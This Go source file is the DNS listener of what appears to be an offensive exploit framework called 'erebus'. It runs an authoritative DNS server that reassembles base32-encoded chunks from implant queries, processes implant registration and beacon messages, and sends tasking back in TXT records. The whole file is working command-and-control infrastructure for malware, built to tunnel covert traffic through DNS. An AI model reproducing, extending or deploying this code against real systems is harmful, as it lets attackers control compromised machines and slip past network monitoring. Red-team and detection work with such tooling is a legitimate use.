package listeners

import (
	"encoding/base32"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/dnstransport"
	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

const chunkBufferTTL = 2 * time.Minute

// DNSListener implements the Listener interface for DNS-based C2 transport.
type DNSListener struct {
	id        string
	name      string
	host      string
	port      uint32
	domain    string
	handler   *BeaconHandler
	server    *dns.Server
	startedAt time.Time
	active    bool
	mu        sync.Mutex

	chunksMu sync.Mutex
	chunks   map[string]*chunkBuffer
}

type chunkBuffer struct {
	chunks  map[int]string // base32 chunk data per seq
	total   int
	updated time.Time
}

func NewDNSListener(config *pb.ListenerConfig, handler *BeaconHandler) (*DNSListener, error) {
	id := config.Id
	if id == "" {
		var err error
		id, err = zcrypto.RandomID(8)
		if err != nil {
			return nil, fmt.Errorf("generate listener ID: %w", err)
		}
	}

	domain := config.Domain
	if domain == "" {
		return nil, fmt.Errorf("domain required for DNS listener")
	}
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}

	return &DNSListener{
		id:      id,
		name:    config.Name,
		host:    config.Host,
		port:    config.Port,
		domain:  domain,
		handler: handler,
		chunks:  make(map[string]*chunkBuffer),
	}, nil
}

func (l *DNSListener) ID() string                    { return l.id }
func (l *DNSListener) Name() string                  { return l.name }
func (l *DNSListener) Protocol() pb.ListenerProtocol { return pb.ListenerProtocol_LISTENER_DNS }
func (l *DNSListener) Address() string               { return fmt.Sprintf("%s:%d", l.host, l.port) }

func (l *DNSListener) Status() *pb.ListenerStatus {
	l.mu.Lock()
	defer l.mu.Unlock()
	return &pb.ListenerStatus{
		Id:        l.id,
		Name:      l.name,
		Protocol:  pb.ListenerProtocol_LISTENER_DNS,
		Address:   l.Address(),
		Active:    l.active,
		StartedAt: l.startedAt.Unix(),
	}
}

func (l *DNSListener) Start() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(l.domain, l.handleDNS)

	addr := l.Address()
	if l.port == 0 {
		addr = l.host + ":53"
	}

	l.server = &dns.Server{
		Addr:    addr,
		Net:     "udp",
		Handler: mux,
	}

	l.mu.Lock()
	l.active = true
	l.startedAt = time.Now()
	l.mu.Unlock()

	go func() {
		log.Printf("[dns] listener started on %s (domain=%s)", addr, l.domain)
		if err := l.server.ListenAndServe(); err != nil {
			log.Printf("[dns] serve error: %v", err)
		}
		l.mu.Lock()
		l.active = false
		l.mu.Unlock()
	}()

	return nil
}

func (l *DNSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.server == nil || !l.active {
		return nil
	}
	l.active = false
	return l.server.Shutdown()
}

func (l *DNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		if q.Qtype != dns.TypeTXT {
			continue
		}

		name := strings.TrimSuffix(q.Name, l.domain)
		parsed, err := dnstransport.ParseQueryName(name)
		if err != nil {
			continue
		}

		responseData := l.ingestChunk(parsed, w.RemoteAddr().String())
		if len(responseData) > 0 {
			l.appendTXTAnswer(msg, q.Name, responseData)
		}
	}

	w.WriteMsg(msg)
}

func (l *DNSListener) ingestChunk(parsed *dnstransport.ParsedQuery, remoteAddr string) []byte {
	key := parsed.SessionLabel

	l.chunksMu.Lock()
	defer l.chunksMu.Unlock()

	l.purgeExpiredChunksLocked()

	buf, ok := l.chunks[key]
	if !ok || parsed.Seq == 0 {
		buf = &chunkBuffer{
			chunks:  make(map[int]string),
			total:   parsed.Total,
			updated: time.Now(),
		}
		l.chunks[key] = buf
	}

	buf.updated = time.Now()
	buf.total = parsed.Total
	buf.chunks[parsed.Seq] = strings.ToUpper(parsed.Data)

	if len(buf.chunks) < buf.total {
		return nil
	}

	for i := 0; i < buf.total; i++ {
		if _, ok := buf.chunks[i]; !ok {
			return nil
		}
	}

	var encoded strings.Builder
	for i := 0; i < buf.total; i++ {
		encoded.WriteString(buf.chunks[i])
	}
	delete(l.chunks, key)

	raw, err := b32.DecodeString(encoded.String())
	if err != nil {
		log.Printf("[dns] reassemble decode error from %s: %v", key, err)
		return nil
	}

	return l.processPayload(raw, remoteAddr)
}

func (l *DNSListener) purgeExpiredChunksLocked() {
	now := time.Now()
	for k, buf := range l.chunks {
		if now.Sub(buf.updated) > chunkBufferTTL {
			delete(l.chunks, k)
		}
	}
}

func (l *DNSListener) processPayload(data []byte, remoteAddr string) []byte {
	reg := &pb.Register{}
	if err := proto.Unmarshal(data, reg); err == nil && reg.ImplantId != "" {
		resp, err := HandleRegister(l.handler, reg, "dns", remoteAddr)
		if err != nil {
			if err != ErrBeaconAuth {
				log.Printf("[dns] register error: %v", err)
			}
			return nil
		}
		out, _ := proto.Marshal(resp)
		return out
	}

	beacon := &pb.Beacon{}
	if err := proto.Unmarshal(data, beacon); err == nil && beacon.ImplantId != "" {
		resp, err := HandleBeacon(l.handler, beacon)
		if err != nil {
			if err != ErrBeaconAuth {
				log.Printf("[dns] beacon error: %v", err)
			}
			return nil
		}
		out, _ := proto.Marshal(resp)
		return out
	}

	return nil
}

func (l *DNSListener) appendTXTAnswer(msg *dns.Msg, qname string, data []byte) {
	encoded := strings.ToLower(b32.EncodeToString(data))
	var txtParts []string
	for len(encoded) > 0 {
		end := 255
		if end > len(encoded) {
			end = len(encoded)
		}
		txtParts = append(txtParts, encoded[:end])
		encoded = encoded[end:]
	}

	msg.Answer = append(msg.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   qname,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Txt: txtParts,
	})
}